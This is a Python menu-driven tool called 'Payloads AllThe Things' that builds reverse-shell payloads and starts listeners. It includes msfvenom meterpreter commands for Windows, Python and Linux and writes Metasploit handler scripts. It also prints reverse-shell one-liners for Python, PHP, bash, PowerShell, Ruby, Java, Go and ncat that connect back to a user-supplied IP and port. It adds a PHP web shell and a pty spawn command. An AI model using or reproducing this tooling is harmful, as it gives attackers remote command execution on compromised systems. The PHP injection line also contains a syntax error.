import os
import subprocess
import pyfiglet
import time
from termcolor import colored

retu = "Ctrl + C => Return To Main\n\n"

try:
    def Windows_Reverse_Shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("windows\nReverseShell\nPayload")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        subprocess.call(
            f"""msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -f exe -o payload.exe""", shell=True)
        x = input("""
We Make Payload Sucss

Do You Want To Start Listener? y/n : """)
        if x == "y":
            try:
                os.remove("msf.rc")
            except:
                pass
            subprocess.call("touch msf.rc", shell=True)
            file = open("msf.rc", "a")
            file.write(f"""
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {ipaddr}
set LPORT {port}
exploit
            """)
            file.close()
            # time.sleep(2)
            subprocess.call("msfconsole -r msf.rc", shell=True)
        else:
            main()

    def Python_Reverse_Shell_msf():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Python\nPayload")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        subprocess.call(
            f"""msfvenom -p python/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -o payload.py""", shell=True)
        x = input("""
We Make Payload Sucss

Do You Want To Start Listener? y/n : """)
        if x == "y":
            try:
                os.remove("msf.rc")
            except:
                pass
            subprocess.call("touch msf.rc", shell=True)
            file = open("msf.rc", "a")
            file.write(f"""
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST {ipaddr}
set LPORT {port}
exploit
            """)
            file.close()
            # time.sleep(2)
            subprocess.call("msfconsole -r msf.rc", shell=True)
        else:
            main()

    def Python3_Reverse_Shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Python3\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (f"""
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipaddr}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
        """)
        print(colored(ff, "white"))

        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def php_reverse_shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("PHP\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (f"""
php -r '$sock=fsockopen("{ipaddr}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'


or :


<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipaddr} {port} >/tmp/f") ?>
        """)
        print(colored(ff, "white"))
        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def bash_reverse_shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Bash\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (f"""
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipaddr} {port} >/tmp/f
        """)
        print(colored(ff, "white"))
        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def powershell_reverse_shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("PowerShell\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (
            'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("' + ipaddr+'",' + port +
            ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"')
        print(colored(ff, "white"))
        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def rubby_reverse_shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Rubby\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (f"""
ruby -rsocket -e'f=TCPSocket.open("{ipaddr}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
        """)
        print(colored(ff, "white"))
        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def java_reverse_shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Java\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (f"""
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ipaddr}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
        """)
        print(colored(ff, "white"))
        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def golang_reverse_shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Golang\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (
            'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","' + ipaddr + ':' + port +
            '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go')
        print(colored(ff, "white"))
        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def ncat_reverse_shell():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Ncat\nReverseShell")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        ff = (f"""
For Linux :
    ncat {ipaddr} {port} -e /bin/bash

For Windows:
    ncat {ipaddr} {port} -e cmd.exe
        """)
        print(colored(ff, "white"))
        x = input("[+] Do You Want To Start Listener ? y/n : ")

        if x == "y":
            subprocess.call(f"nc -lvnp {port}", shell=True)

        else:
            main()

    def linux_reverse_tcp():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Linux\nReverseTcp")
        print(colored(ascii_banner, "yellow"))
        print("\n\n")
        print(retu)
        ipaddr = input(colored("[-] Enter Your Ip : ", "red"))
        port = input(colored("\n[+] Enter Your Port : ", "blue"))
        subprocess.call(
            f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ipaddr} LPORT={port} -f elf > payload.elf", shell=True)
        x = input("""
We Make Payload Sucss

Do You Want To Start Listener? y/n : """)
        if x == "y":
            try:
                os.remove("msf.rc")
            except:
                pass
            file = open("msf.rc", "a")
            file.write(f"""
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST {ipaddr}
set LPORT {port}
exploit -j
            """)
            file.close()
            subprocess.call("msfconsole -r msf.rc", shell=True)
        else:
            main()

    def php_Code_injection():
        ff = "\n<?php system($_GET['cmd'];) ?>"
        print(colored(ff, "white"))
        input("\n\n[+] Enter To Return : ")
        main()

    def Interactive_Terminal():
        ff = "\npython3 -c \"import pty;pty.spawn('/bin/bash')\""
        print(colored(ff, "white"))
        input("\n\n[+] Enter To Return : ")
        main()

    def main():
        os.system("clear")
        ascii_banner = pyfiglet.figlet_format("Payloads\nAllThe\nThings")
        print(colored(ascii_banner, "yellow"))
        print("Programmed By Taha @BB2.L")
        try:
            payload_num = int(input(colored("""

[1] Windows Reverse Shell Payload x64 (metasploit)
[2] Python Payload (metasploit)
[3] Python3 Reverse Shell
[4] PHP Reverse Shell
[5] Bash Reverse Shell
[6] Powershell Reverse Shell
[7] Ruby Reverse Shell
[8] Java Reverse Shell
[9] Golang Reverse Shell
[10] Ncat Reverse Shell
[11] Linux Stageless reverse TCP (metasploit)
[12] PHP Code Injection
[13] Interactive Terminal Spawned Via Python
[00] EXIT

[+] Chose Numper : """, "cyan")))
        except ValueError:
            print("{+} Wrong ....")
            time.sleep(3)
            main()
        except KeyboardInterrupt:
            ex = input("\n\n[+] Do You Want To Exit ? y/n : ")
            if ex == "y":
                exit()
            else:
                main()
        if payload_num == 1:
            Windows_Reverse_Shell()
        elif payload_num == 2:
            Python_Reverse_Shell_msf()
        elif payload_num == 3:
            Python3_Reverse_Shell()
        elif payload_num == 4:
            php_reverse_shell()
        elif payload_num == 5:
            bash_reverse_shell()
        elif payload_num == 6:
            powershell_reverse_shell()
        elif payload_num == 7:
            rubby_reverse_shell()
        elif payload_num == 8:
            java_reverse_shell()
        elif payload_num == 9:
            golang_reverse_shell()
        elif payload_num == 10:
            ncat_reverse_shell()
        elif payload_num == 11:
            linux_reverse_tcp()
        elif payload_num == 00:
            exit()
        elif payload_num == 12:
            php_Code_injection()
        elif payload_num == 13:
            Interactive_Terminal()
        else:
            print("{+} Wrong ..... ")
            time.sleep(3)
            return main()

    main()
except KeyboardInterrupt:
    main()
